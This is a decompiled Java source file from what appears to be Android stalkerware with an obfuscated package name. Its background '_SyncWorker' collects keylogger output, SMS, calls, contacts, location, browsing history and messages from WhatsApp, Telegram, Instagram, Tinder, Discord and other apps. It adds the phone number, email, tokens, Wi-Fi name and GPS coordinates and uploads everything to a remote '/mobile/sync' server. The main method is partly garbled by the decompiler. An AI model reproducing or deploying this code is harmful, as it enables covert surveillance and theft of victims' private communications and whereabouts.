package com.zgoicsifmc.tasks;

import android.content.Context;
import android.os.Build;
import androidx.work.Worker;
import androidx.work.WorkerParameters;
import defpackage.zn;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Locale;
import java.util.Map;
import org.json.JSONObject;

public class _SyncWorker extends Worker {

    public class a extends ro {
        public final /* synthetic */ String d;

        /* JADX INFO: super call moved to the top of the method (can break code semantics) */
        public a(int i, String str, JSONObject jSONObject, zn.b bVar, zn.a aVar, String str2) {
            super(i, str, jSONObject, bVar, aVar);
            this.d = str2;
        }

        public Map<String, String> o() {
            HashMap hashMap = new HashMap();
            hashMap.put("User-Agent", String.format(Locale.US, "%s/%s (Android %s; %s; %s %s; %s)", new Object[]{"com.zgoicsifmc.giiruazsa", "5.3.0", Build.VERSION.RELEASE, Build.MODEL, Build.BRAND, Build.DEVICE, Locale.getDefault().getLanguage()}));
            hashMap.put("uuid", this.d);
            return hashMap;
        }
    }

    public _SyncWorker(Context context, WorkerParameters workerParameters) {
        super(context, workerParameters);
    }

    public static /* synthetic */ void p(JSONObject jSONObject, xt1 xt1, JSONObject jSONObject2) {
        try {
            o82.d(jSONObject2.toString(), new Object[0]);
            o82.d(jSONObject.toString(), new Object[0]);
            if (!jSONObject2.getString("status").equals("FAILED")) {
                xt1.v("status", jSONObject2.getString("status"));
                Iterator<String> keys = jSONObject.keys();
                while (keys.hasNext()) {
                    String next = keys.next();
                    xt1.A(next, jSONObject.getLong(next));
                    xt1.B(next);
                }
                JSONObject jSONObject3 = jSONObject2.getJSONObject("limit");
                Iterator<String> keys2 = jSONObject3.keys();
                while (keys2.hasNext()) {
                    String next2 = keys2.next();
                    xt1.D(next2, jSONObject3.getInt(next2));
                }
                JSONObject jSONObject4 = jSONObject2.getJSONObject("time");
                Iterator<String> keys3 = jSONObject4.keys();
                while (keys3.hasNext()) {
                    String next3 = keys3.next();
                    xt1.C(next3, (long) jSONObject4.getInt(next3));
                }
            }
        } catch (Exception e) {
            qg1.a().c(e);
            e.printStackTrace();
        }
    }

    public static /* synthetic */ void q(eo eoVar) {
        o82.d("Sync Fail", new Object[0]);
        o82.e(eoVar);
    }

    /* JADX WARNING: Removed duplicated region for block: B:102:0x0257 A[Catch:{ JSONException -> 0x0268 }] */
    /* JADX WARNING: Removed duplicated region for block: B:108:0x027a A[Catch:{ JSONException -> 0x028b }] */
    /* JADX WARNING: Removed duplicated region for block: B:114:0x029d A[Catch:{ JSONException -> 0x02ae }] */
    /* JADX WARNING: Removed duplicated region for block: B:120:0x02c0 A[Catch:{ JSONException -> 0x02d1 }] */
    /* JADX WARNING: Removed duplicated region for block: B:126:0x02e3 A[Catch:{ JSONException -> 0x02f4 }] */
    /* JADX WARNING: Removed duplicated region for block: B:132:0x0306 A[Catch:{ JSONException -> 0x0317 }] */
    /* JADX WARNING: Removed duplicated region for block: B:138:0x0329 A[Catch:{ JSONException -> 0x033c }] */
    /* JADX WARNING: Removed duplicated region for block: B:143:0x0359  */
    /* JADX WARNING: Removed duplicated region for block: B:30:0x00c1 A[Catch:{ JSONException -> 0x00d0 }] */
    /* JADX WARNING: Removed duplicated region for block: B:36:0x00e2 A[Catch:{ JSONException -> 0x00f1 }] */
    /* JADX WARNING: Removed duplicated region for block: B:42:0x0103 A[Catch:{ JSONException -> 0x0112 }] */
    /* JADX WARNING: Removed duplicated region for block: B:48:0x0124 A[Catch:{ JSONException -> 0x0133 }] */
    /* JADX WARNING: Removed duplicated region for block: B:54:0x0145 A[Catch:{ JSONException -> 0x0154 }] */
    /* JADX WARNING: Removed duplicated region for block: B:60:0x0166 A[Catch:{ JSONException -> 0x0175 }] */
    /* JADX WARNING: Removed duplicated region for block: B:66:0x0187 A[Catch:{ JSONException -> 0x0196 }] */
    /* JADX WARNING: Removed duplicated region for block: B:72:0x01a8 A[Catch:{ JSONException -> 0x01b9 }] */
    /* JADX WARNING: Removed duplicated region for block: B:78:0x01cb A[Catch:{ JSONException -> 0x01dc }] */
    /* JADX WARNING: Removed duplicated region for block: B:84:0x01ee A[Catch:{ JSONException -> 0x01ff }] */
    /* JADX WARNING: Removed duplicated region for block: B:90:0x0211 A[Catch:{ JSONException -> 0x0222 }] */
    /* JADX WARNING: Removed duplicated region for block: B:96:0x0234 A[Catch:{ JSONException -> 0x0245 }] */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public androidx.work.ListenableWorker.a o() {
        /*
            r29 = this;
            java.lang.String r1 = "telegram"
            java.lang.String r2 = "facebook"
            java.lang.String r3 = "snapchat"
            java.lang.String r4 = "tiktok"
            java.lang.String r5 = "tinder"
            java.lang.String r6 = "badoo"
            java.lang.String r7 = "whatsapp"
            java.lang.String r8 = "websearch"
            java.lang.String r9 = "webhistory"
            java.lang.String r10 = "sms"
            java.lang.String r11 = "location"
            java.lang.String r12 = "keylogger"
            java.lang.String r13 = "instagram"
            java.lang.String r14 = "discord"
            java.lang.String r15 = "discordcall"
            r16 = r1
            java.lang.String r1 = "whatsappcall"
            r17 = r2
            java.lang.String r2 = "contact"
            r18 = r3
            java.lang.String r3 = "call"
            r19 = r4
            java.lang.String r4 = "app"
            r20 = r5
            java.lang.String r5 = ""
            r21 = r5
            android.content.Context r5 = r29.a()
            r22 = r6
            xt1 r6 = new xt1
            r6.<init>(r5)
            ij r0 = r29.f()
            r23 = r7
            java.lang.String r7 = "force"
            r24 = r8
            r8 = 0
            boolean r7 = r0.h(r7, r8)
            java.lang.String r8 = "sync"
            boolean r0 = r6.a(r8, r7)
            if (r0 != 0) goto L_0x0063
            r8 = 0
            java.lang.Object[] r0 = new java.lang.Object[r8]
            java.lang.String r1 = "sincronização negada"
            defpackage.o82.a(r1, r0)
        L_0x005e:
            androidx.work.ListenableWorker$a r0 = androidx.work.ListenableWorker.a.c()
            return r0
        L_0x0063:
            r25 = r8
            r6.E()     // Catch:{ Exception -> 0x0069 }
            goto L_0x0075
        L_0x0069:
            r0 = move-exception
            r8 = r0
            qg1 r0 = defpackage.qg1.a()
            r0.c(r8)
            r8.printStackTrace()
        L_0x0075:
            org.json.JSONObject r8 = new org.json.JSONObject
            r8.<init>()
            r26 = r9
            org.json.JSONObject r9 = new org.json.JSONObject
            r9.<init>()
            ix1 r0 = defpackage.jw1.a(r5, r6, r7)     // Catch:{ JSONException -> 0x00ab }
            org.json.JSONArray r27 = r0.a()     // Catch:{ JSONException -> 0x00ab }
            int r27 = r27.length()     // Catch:{ JSONException -> 0x00ab }
            if (r27 <= 0) goto L_0x00a6
            r27 = r10
            org.json.JSONArray r10 = r0.a()     // Catch:{ JSONException -> 0x00a4 }
            r8.put(r4, r10)     // Catch:{ JSONException -> 0x00a4 }
            r28 = r11
            long r10 = r0.b()     // Catch:{ JSONException -> 0x00a2 }
            r9.put(r4, r10)     // Catch:{ JSONException -> 0x00a2 }
            goto L_0x00b3
        L_0x00a2:
            r0 = move-exception
            goto L_0x00b0
        L_0x00a4:
            r0 = move-exception
            goto L_0x00ae
        L_0x00a6:
            r27 = r10
            r28 = r11
            goto L_0x00b3
        L_0x00ab:
            r0 = move-exception
            r27 = r10
        L_0x00ae:
            r28 = r11
        L_0x00b0:
            r0.printStackTrace()
        L_0x00b3:
            ix1 r0 = defpackage.lw1.a(r5, r6, r7)     // Catch:{ JSONException -> 0x00d0 }
            org.json.JSONArray r4 = r0.a()     // Catch:{ JSONException -> 0x00d0 }
            int r4 = r4.length()     // Catch:{ JSONException -> 0x00d0 }
            if (r4 <= 0) goto L_0x00d4
            org.json.JSONArray r4 = r0.a()     // Catch:{ JSONException -> 0x00d0 }
            r8.put(r3, r4)     // Catch:{ JSONException -> 0x00d0 }
            long r10 = r0.b()     // Catch:{ JSONException -> 0x00d0 }
            r9.put(r3, r10)     // Catch:{ JSONException -> 0x00d0 }
            goto L_0x00d4
        L_0x00d0:
            r0 = move-exception
            r0.printStackTrace()
        L_0x00d4:
            ix1 r0 = defpackage.mw1.a(r5, r6, r7)     // Catch:{ JSONException -> 0x00f1 }
            org.json.JSONArray r3 = r0.a()     // Catch:{ JSONException -> 0x00f1 }
            int r3 = r3.length()     // Catch:{ JSONException -> 0x00f1 }
            if (r3 <= 0) goto L_0x00f5
            org.json.JSONArray r3 = r0.a()     // Catch:{ JSONException -> 0x00f1 }
            r8.put(r2, r3)     // Catch:{ JSONException -> 0x00f1 }
            long r3 = r0.b()     // Catch:{ JSONException -> 0x00f1 }
            r9.put(r2, r3)     // Catch:{ JSONException -> 0x00f1 }
            goto L_0x00f5
        L_0x00f1:
            r0 = move-exception
            r0.printStackTrace()
        L_0x00f5:
            ix1 r0 = defpackage.gx1.a(r6, r7)     // Catch:{ JSONException -> 0x0112 }
            org.json.JSONArray r2 = r0.a()     // Catch:{ JSONException -> 0x0112 }
            int r2 = r2.length()     // Catch:{ JSONException -> 0x0112 }
            if (r2 <= 0) goto L_0x0116
            org.json.JSONArray r2 = r0.a()     // Catch:{ JSONException -> 0x0112 }
            r8.put(r1, r2)     // Catch:{ JSONException -> 0x0112 }
            long r2 = r0.b()     // Catch:{ JSONException -> 0x0112 }
            r9.put(r1, r2)     // Catch:{ JSONException -> 0x0112 }
            goto L_0x0116
        L_0x0112:
            r0 = move-exception
            r0.printStackTrace()
        L_0x0116:
            ix1 r0 = defpackage.ow1.a(r6, r7)     // Catch:{ JSONException -> 0x0133 }
            org.json.JSONArray r1 = r0.a()     // Catch:{ JSONException -> 0x0133 }
            int r1 = r1.length()     // Catch:{ JSONException -> 0x0133 }
            if (r1 <= 0) goto L_0x0137
            org.json.JSONArray r1 = r0.a()     // Catch:{ JSONException -> 0x0133 }
            r8.put(r15, r1)     // Catch:{ JSONException -> 0x0133 }
            long r0 = r0.b()     // Catch:{ JSONException -> 0x0133 }
            r9.put(r15, r0)     // Catch:{ JSONException -> 0x0133 }
            goto L_0x0137
        L_0x0133:
            r0 = move-exception
            r0.printStackTrace()
        L_0x0137:
            ix1 r0 = defpackage.nw1.a(r5, r6, r7)     // Catch:{ JSONException -> 0x0154 }
            org.json.JSONArray r1 = r0.a()     // Catch:{ JSONException -> 0x0154 }
            int r1 = r1.length()     // Catch:{ JSONException -> 0x0154 }
            if (r1 <= 0) goto L_0x0158
            org.json.JSONArray r1 = r0.a()     // Catch:{ JSONException -> 0x0154 }
            r8.put(r14, r1)     // Catch:{ JSONException -> 0x0154 }
            long r0 = r0.b()     // Catch:{ JSONException -> 0x0154 }
            r9.put(r14, r0)     // Catch:{ JSONException -> 0x0154 }
            goto L_0x0158
        L_0x0154:
            r0 = move-exception
            r0.printStackTrace()
        L_0x0158:
            ix1 r0 = defpackage.qw1.a(r6, r7)     // Catch:{ JSONException -> 0x0175 }
            org.json.JSONArray r1 = r0.a()     // Catch:{ JSONException -> 0x0175 }
            int r1 = r1.length()     // Catch:{ JSONException -> 0x0175 }
            if (r1 <= 0) goto L_0x0179
            org.json.JSONArray r1 = r0.a()     // Catch:{ JSONException -> 0x0175 }
            r8.put(r13, r1)     // Catch:{ JSONException -> 0x0175 }
            long r0 = r0.b()     // Catch:{ JSONException -> 0x0175 }
            r9.put(r13, r0)     // Catch:{ JSONException -> 0x0175 }
            goto L_0x0179
        L_0x0175:
            r0 = move-exception
            r0.printStackTrace()
        L_0x0179:
            ix1 r0 = defpackage.rw1.a(r6, r7)     // Catch:{ JSONException -> 0x0196 }
            org.json.JSONArray r1 = r0.a()     // Catch:{ JSONException -> 0x0196 }
            int r1 = r1.length()     // Catch:{ JSONException -> 0x0196 }
            if (r1 <= 0) goto L_0x019a
            org.json.JSONArray r1 = r0.a()     // Catch:{ JSONException -> 0x0196 }
            r8.put(r12, r1)     // Catch:{ JSONException -> 0x0196 }
            long r0 = r0.b()     // Catch:{ JSONException -> 0x0196 }
            r9.put(r12, r0)     // Catch:{ JSONException -> 0x0196 }
            goto L_0x019a
        L_0x0196:
            r0 = move-exception
            r0.printStackTrace()
        L_0x019a:
            ix1 r0 = defpackage.tw1.a(r5, r6, r7)     // Catch:{ JSONException -> 0x01b9 }
            org.json.JSONArray r1 = r0.a()     // Catch:{ JSONException -> 0x01b9 }
            int r1 = r1.length()     // Catch:{ JSONException -> 0x01b9 }
            if (r1 <= 0) goto L_0x01bd
            org.json.JSONArray r1 = r0.a()     // Catch:{ JSONException -> 0x01b9 }
            r2 = r28
            r8.put(r2, r1)     // Catch:{ JSONException -> 0x01b9 }
            long r0 = r0.b()     // Catch:{ JSONException -> 0x01b9 }
            r9.put(r2, r0)     // Catch:{ JSONException -> 0x01b9 }
            goto L_0x01bd
        L_0x01b9:
            r0 = move-exception
            r0.printStackTrace()
        L_0x01bd:
            ix1 r0 = defpackage.xw1.a(r5, r6, r7)     // Catch:{ JSONException -> 0x01dc }
            org.json.JSONArray r1 = r0.a()     // Catch:{ JSONException -> 0x01dc }
            int r1 = r1.length()     // Catch:{ JSONException -> 0x01dc }
            if (r1 <= 0) goto L_0x01e0
            org.json.JSONArray r1 = r0.a()     // Catch:{ JSONException -> 0x01dc }
            r2 = r27
            r8.put(r2, r1)     // Catch:{ JSONException -> 0x01dc }
            long r0 = r0.b()     // Catch:{ JSONException -> 0x01dc }
            r9.put(r2, r0)     // Catch:{ JSONException -> 0x01dc }
            goto L_0x01e0
        L_0x01dc:
            r0 = move-exception
            r0.printStackTrace()
        L_0x01e0:
            ix1 r0 = defpackage.cx1.a(r6, r7)     // Catch:{ JSONException -> 0x01ff }
            org.json.JSONArray r1 = r0.a()     // Catch:{ JSONException -> 0x01ff }
            int r1 = r1.length()     // Catch:{ JSONException -> 0x01ff }
            if (r1 <= 0) goto L_0x0203
            org.json.JSONArray r1 = r0.a()     // Catch:{ JSONException -> 0x01ff }
            r2 = r26
            r8.put(r2, r1)     // Catch:{ JSONException -> 0x01ff }
            long r0 = r0.b()     // Catch:{ JSONException -> 0x01ff }
            r9.put(r2, r0)     // Catch:{ JSONException -> 0x01ff }
            goto L_0x0203
        L_0x01ff:
            r0 = move-exception
            r0.printStackTrace()
        L_0x0203:
            ix1 r0 = defpackage.dx1.a(r6, r7)     // Catch:{ JSONException -> 0x0222 }
            org.json.JSONArray r1 = r0.a()     // Catch:{ JSONException -> 0x0222 }
            int r1 = r1.length()     // Catch:{ JSONException -> 0x0222 }
            if (r1 <= 0) goto L_0x0226
            org.json.JSONArray r1 = r0.a()     // Catch:{ JSONException -> 0x0222 }
            r2 = r24
            r8.put(r2, r1)     // Catch:{ JSONException -> 0x0222 }
            long r0 = r0.b()     // Catch:{ JSONException -> 0x0222 }
            r9.put(r2, r0)     // Catch:{ JSONException -> 0x0222 }
            goto L_0x0226
        L_0x0222:
            r0 = move-exception
            r0.printStackTrace()
        L_0x0226:
            ix1 r0 = defpackage.ex1.a(r5, r6, r7)     // Catch:{ JSONException -> 0x0245 }
            org.json.JSONArray r1 = r0.a()     // Catch:{ JSONException -> 0x0245 }
            int r1 = r1.length()     // Catch:{ JSONException -> 0x0245 }
            if (r1 <= 0) goto L_0x0249
            org.json.JSONArray r1 = r0.a()     // Catch:{ JSONException -> 0x0245 }
            r2 = r23
            r8.put(r2, r1)     // Catch:{ JSONException -> 0x0245 }
            long r0 = r0.b()     // Catch:{ JSONException -> 0x0245 }
            r9.put(r2, r0)     // Catch:{ JSONException -> 0x0245 }
            goto L_0x0249
        L_0x0245:
            r0 = move-exception
            r0.printStackTrace()
        L_0x0249:
            ix1 r0 = defpackage.kw1.a(r5, r6, r7)     // Catch:{ JSONException -> 0x0268 }
            org.json.JSONArray r1 = r0.a()     // Catch:{ JSONException -> 0x0268 }
            int r1 = r1.length()     // Catch:{ JSONException -> 0x0268 }
            if (r1 <= 0) goto L_0x026c
            org.json.JSONArray r1 = r0.a()     // Catch:{ JSONException -> 0x0268 }
            r2 = r22
            r8.put(r2, r1)     // Catch:{ JSONException -> 0x0268 }
            long r0 = r0.b()     // Catch:{ JSONException -> 0x0268 }
            r9.put(r2, r0)     // Catch:{ JSONException -> 0x0268 }
            goto L_0x026c
        L_0x0268:
            r0 = move-exception
            r0.printStackTrace()
        L_0x026c:
            ix1 r0 = defpackage.bx1.a(r5, r6, r7)     // Catch:{ JSONException -> 0x028b }
            org.json.JSONArray r1 = r0.a()     // Catch:{ JSONException -> 0x028b }
            int r1 = r1.length()     // Catch:{ JSONException -> 0x028b }
            if (r1 <= 0) goto L_0x028f
            org.json.JSONArray r1 = r0.a()     // Catch:{ JSONException -> 0x028b }
            r2 = r20
            r8.put(r2, r1)     // Catch:{ JSONException -> 0x028b }
            long r0 = r0.b()     // Catch:{ JSONException -> 0x028b }
            r9.put(r2, r0)     // Catch:{ JSONException -> 0x028b }
            goto L_0x028f
        L_0x028b:
            r0 = move-exception
            r0.printStackTrace()
        L_0x028f:
            ix1 r0 = defpackage.ax1.a(r5, r6, r7)     // Catch:{ JSONException -> 0x02ae }
            org.json.JSONArray r1 = r0.a()     // Catch:{ JSONException -> 0x02ae }
            int r1 = r1.length()     // Catch:{ JSONException -> 0x02ae }
            if (r1 <= 0) goto L_0x02b2
            org.json.JSONArray r1 = r0.a()     // Catch:{ JSONException -> 0x02ae }
            r2 = r19
            r8.put(r2, r1)     // Catch:{ JSONException -> 0x02ae }
            long r0 = r0.b()     // Catch:{ JSONException -> 0x02ae }
            r9.put(r2, r0)     // Catch:{ JSONException -> 0x02ae }
            goto L_0x02b2
        L_0x02ae:
            r0 = move-exception
            r0.printStackTrace()
        L_0x02b2:
            ix1 r0 = defpackage.yw1.a(r5, r6, r7)     // Catch:{ JSONException -> 0x02d1 }
            org.json.JSONArray r1 = r0.a()     // Catch:{ JSONException -> 0x02d1 }
            int r1 = r1.length()     // Catch:{ JSONException -> 0x02d1 }
            if (r1 <= 0) goto L_0x02d5
            org.json.JSONArray r1 = r0.a()     // Catch:{ JSONException -> 0x02d1 }
            r2 = r18
            r8.put(r2, r1)     // Catch:{ JSONException -> 0x02d1 }
            long r0 = r0.b()     // Catch:{ JSONException -> 0x02d1 }
            r9.put(r2, r0)     // Catch:{ JSONException -> 0x02d1 }
            goto L_0x02d5
        L_0x02d1:
            r0 = move-exception
            r0.printStackTrace()
        L_0x02d5:
            ix1 r0 = defpackage.pw1.a(r5, r6, r7)     // Catch:{ JSONException -> 0x02f4 }
            org.json.JSONArray r1 = r0.a()     // Catch:{ JSONException -> 0x02f4 }
            int r1 = r1.length()     // Catch:{ JSONException -> 0x02f4 }
            if (r1 <= 0) goto L_0x02f8
            org.json.JSONArray r1 = r0.a()     // Catch:{ JSONException -> 0x02f4 }
            r2 = r17
            r8.put(r2, r1)     // Catch:{ JSONException -> 0x02f4 }
            long r0 = r0.b()     // Catch:{ JSONException -> 0x02f4 }
            r9.put(r2, r0)     // Catch:{ JSONException -> 0x02f4 }
            goto L_0x02f8
        L_0x02f4:
            r0 = move-exception
            r0.printStackTrace()
        L_0x02f8:
            ix1 r0 = defpackage.zw1.a(r5, r6, r7)     // Catch:{ JSONException -> 0x0317 }
            org.json.JSONArray r1 = r0.a()     // Catch:{ JSONException -> 0x0317 }
            int r1 = r1.length()     // Catch:{ JSONException -> 0x0317 }
            if (r1 <= 0) goto L_0x031b
            org.json.JSONArray r1 = r0.a()     // Catch:{ JSONException -> 0x0317 }
            r2 = r16
            r8.put(r2, r1)     // Catch:{ JSONException -> 0x0317 }
            long r0 = r0.b()     // Catch:{ JSONException -> 0x0317 }
            r9.put(r2, r0)     // Catch:{ JSONException -> 0x0317 }
            goto L_0x031b
        L_0x0317:
            r0 = move-exception
            r0.printStackTrace()
        L_0x031b:
            ix1 r0 = defpackage.sw1.a(r5, r6, r7)     // Catch:{ JSONException -> 0x033c }
            org.json.JSONArray r1 = r0.a()     // Catch:{ JSONException -> 0x033c }
            int r1 = r1.length()     // Catch:{ JSONException -> 0x033c }
            if (r1 <= 0) goto L_0x0340
            java.lang.String r1 = "kwai"
            org.json.JSONArray r2 = r0.a()     // Catch:{ JSONException -> 0x033c }
            r8.put(r1, r2)     // Catch:{ JSONException -> 0x033c }
            java.lang.String r1 = "kwai"
            long r2 = r0.b()     // Catch:{ JSONException -> 0x033c }
            r9.put(r1, r2)     // Catch:{ JSONException -> 0x033c }
            goto L_0x0340
        L_0x033c:
            r0 = move-exception
            r0.printStackTrace()
        L_0x0340:
            r0 = 1
            java.lang.Object[] r0 = new java.lang.Object[r0]
            int r1 = r8.length()
            java.lang.Integer r1 = java.lang.Integer.valueOf(r1)
            r2 = 0
            r0[r2] = r1
            java.lang.String r1 = "To Sync: %s"
            defpackage.o82.d(r1, r0)
            int r0 = r8.length()
            if (r0 <= 0) goto L_0x047d
            java.util.Iterator r0 = r8.keys()
        L_0x035d:
            boolean r1 = r0.hasNext()
            if (r1 == 0) goto L_0x0375
            java.lang.Object r1 = r0.next()
            java.lang.String r1 = (java.lang.String) r1
            r2 = 1
            java.lang.Object[] r2 = new java.lang.Object[r2]
            r3 = 0
            r2[r3] = r1
            java.lang.String r1 = "Syncing %s"
            defpackage.o82.d(r1, r2)
            goto L_0x035d
        L_0x0375:
            java.lang.String r0 = com.zgoicsifmc.App.h()     // Catch:{ Exception -> 0x0472 }
            org.json.JSONObject r14 = new org.json.JSONObject     // Catch:{ Exception -> 0x0472 }
            r14.<init>()     // Catch:{ Exception -> 0x0472 }
            java.lang.String r1 = "email"
            java.lang.String r2 = "email"
            r3 = r21
            java.lang.String r2 = r6.c(r2, r3)     // Catch:{ Exception -> 0x0472 }
            r14.put(r1, r2)     // Catch:{ Exception -> 0x0472 }
            java.lang.String r1 = "uuid"
            r14.put(r1, r0)     // Catch:{ Exception -> 0x0472 }
            java.lang.String r1 = "uid"
            java.lang.String r2 = "uid"
            java.lang.String r2 = r6.c(r2, r3)     // Catch:{ Exception -> 0x0472 }
            r14.put(r1, r2)     // Catch:{ Exception -> 0x0472 }
            java.lang.String r1 = "firebase_token"
            java.lang.String r2 = "firebase_token"
            java.lang.String r2 = r6.c(r2, r3)     // Catch:{ Exception -> 0x0472 }
            r14.put(r1, r2)     // Catch:{ Exception -> 0x0472 }
            java.lang.String r1 = "provider"
            java.lang.String r2 = "provider"
            java.lang.String r2 = r6.c(r2, r3)     // Catch:{ Exception -> 0x0472 }
            r14.put(r1, r2)     // Catch:{ Exception -> 0x0472 }
            java.lang.String r1 = "device"
            java.lang.String r2 = "device"
            java.lang.String r2 = r6.c(r2, r3)     // Catch:{ Exception -> 0x0472 }
            r14.put(r1, r2)     // Catch:{ Exception -> 0x0472 }
            java.lang.String r1 = "sdk"
            java.lang.String r2 = "sdk"
            java.lang.String r2 = r6.c(r2, r3)     // Catch:{ Exception -> 0x0472 }
            r14.put(r1, r2)     // Catch:{ Exception -> 0x0472 }
            java.lang.String r1 = "version"
            java.lang.String r2 = "version"
            java.lang.String r2 = r6.c(r2, r3)     // Catch:{ Exception -> 0x0472 }
            r14.put(r1, r2)     // Catch:{ Exception -> 0x0472 }
            java.lang.String r1 = "phone"
            java.lang.String r2 = "phone"
            java.lang.String r2 = r6.c(r2, r3)     // Catch:{ Exception -> 0x0472 }
            r14.put(r1, r2)     // Catch:{ Exception -> 0x0472 }
            java.lang.String r1 = "apkversion"
            java.lang.String r2 = "5.3.0"
            r14.put(r1, r2)     // Catch:{ Exception -> 0x0472 }
            java.lang.String r1 = "battery"
            java.lang.String r2 = "battery"
            r4 = 0
            int r2 = r6.b(r2, r4)     // Catch:{ Exception -> 0x0472 }
            r14.put(r1, r2)     // Catch:{ Exception -> 0x0472 }
            java.lang.String r1 = "network"
            java.lang.String r2 = "network"
            java.lang.String r2 = r6.c(r2, r3)     // Catch:{ Exception -> 0x0472 }
            r14.put(r1, r2)     // Catch:{ Exception -> 0x0472 }
            java.lang.String r1 = "rooted"
            java.lang.String r2 = "rooted"
            r4 = 0
            boolean r2 = r6.d(r2, r4)     // Catch:{ Exception -> 0x0472 }
            r14.put(r1, r2)     // Catch:{ Exception -> 0x0472 }
            java.lang.String r1 = "gps"
            java.lang.String r2 = "gps"
            boolean r2 = r6.d(r2, r4)     // Catch:{ Exception -> 0x0472 }
            r14.put(r1, r2)     // Catch:{ Exception -> 0x0472 }
            java.lang.String r1 = "country"
            java.lang.String r2 = "country"
            java.lang.String r2 = r6.c(r2, r3)     // Catch:{ Exception -> 0x0472 }
            r14.put(r1, r2)     // Catch:{ Exception -> 0x0472 }
            java.lang.String r1 = "wifi_ssid"
            java.lang.String r2 = "wifi_ssid"
            java.lang.String r2 = r6.c(r2, r3)     // Catch:{ Exception -> 0x0472 }
            r14.put(r1, r2)     // Catch:{ Exception -> 0x0472 }
            java.lang.String r1 = "latitude"
            double r2 = r6.g()     // Catch:{ Exception -> 0x0472 }
            r14.put(r1, r2)     // Catch:{ Exception -> 0x0472 }
            java.lang.String r1 = "longitude"
            double r2 = r6.k()     // Catch:{ Exception -> 0x0472 }
            r14.put(r1, r2)     // Catch:{ Exception -> 0x0472 }
            java.lang.String r1 = "location_updated_at"
            long r2 = r6.h()     // Catch:{ Exception -> 0x0472 }
            r14.put(r1, r2)     // Catch:{ Exception -> 0x0472 }
            java.lang.String r1 = r14.toString()     // Catch:{ Exception -> 0x0472 }
            r2 = 0
            java.lang.Object[] r2 = new java.lang.Object[r2]     // Catch:{ Exception -> 0x0472 }
            defpackage.o82.d(r1, r2)     // Catch:{ Exception -> 0x0472 }
            java.lang.String r1 = "data"
            r14.put(r1, r8)     // Catch:{ Exception -> 0x0472 }
            java.lang.String r1 = "/mobile/sync"
            java.lang.String r13 = r6.e(r1)     // Catch:{ Exception -> 0x0472 }
            com.zgoicsifmc.App r1 = com.zgoicsifmc.App.e()     // Catch:{ Exception -> 0x0472 }
            com.zgoicsifmc.tasks._SyncWorker$a r2 = new com.zgoicsifmc.tasks._SyncWorker$a     // Catch:{ Exception -> 0x0472 }
            r12 = 1
            iw1 r15 = new iw1     // Catch:{ Exception -> 0x0472 }
            r15.<init>(r9, r6)     // Catch:{ Exception -> 0x0472 }
            hw1 r16 = defpackage.hw1.a     // Catch:{ Exception -> 0x0472 }
            r10 = r2
            r11 = r29
            r17 = r0
            r10.<init>(r12, r13, r14, r15, r16, r17)     // Catch:{ Exception -> 0x0472 }
            r1.c(r2)     // Catch:{ Exception -> 0x0472 }
            goto L_0x047d
        L_0x0472:
            r0 = move-exception
            qg1 r1 = defpackage.qg1.a()
            r1.c(r0)
            r0.printStackTrace()
        L_0x047d:
            r1 = r25
            r6.B(r1)
            goto L_0x005e
        */
        throw new UnsupportedOperationException("Method not decompiled: com.zgoicsifmc.tasks._SyncWorker.o():androidx.work.ListenableWorker$a");
    }
}
